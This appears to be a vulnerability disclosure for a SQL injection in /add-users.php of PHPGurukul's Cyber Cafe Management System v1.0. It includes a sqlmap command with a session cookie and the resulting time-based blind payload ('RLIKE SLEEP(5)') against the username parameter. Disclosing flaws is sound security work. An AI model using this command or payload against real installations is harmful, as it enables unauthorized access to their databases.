# SQLi vulnerability in Cyber Cafe Management System Project v1.0 of file /add-users.php

**vender**:

[PHP Project, PHP Projects Ideas, PHP Latest tutorials, PHP oops Concept](https://phpgurukul.com/)

[Cyber Cafe Management System Using PHP & MySQL , Cyber Cafe Management System Project](https://phpgurukul.com/cyber-cafe-management-system-using-php-mysql/)

**SoftLink**:

[Cyber Cafe Management System Using PHP & MySQL , Cyber Cafe Management System Project](https://phpgurukul.com/cyber-cafe-management-system-using-php-mysql/)

**Vulnerable File**

- /add-users.php

**Version**

- V1.0

### POC

```bash
sqlmap -u "http://192.168.93.1/ccms/add-users.php" --data="username=admin&uadd=test&mobilenumber=admin&email=test@test.com&cname=2&idproof=test123&submit=Add"
--cookie="PHPSESSID=q8vu4tgrhj01ikmjm3u469chil" --dbms=mysql --level=2
```



```bash
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 RLIKE time-based blind
    Payload: username=admin' RLIKE SLEEP(5) AND 'OrNQ'='OrNQ&uadd=test&mobilenumber=admin&email=test@test.com&cname=2&idproof=test123&submit=Add
---
```



![image-20251212115530415](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202512121155485.png)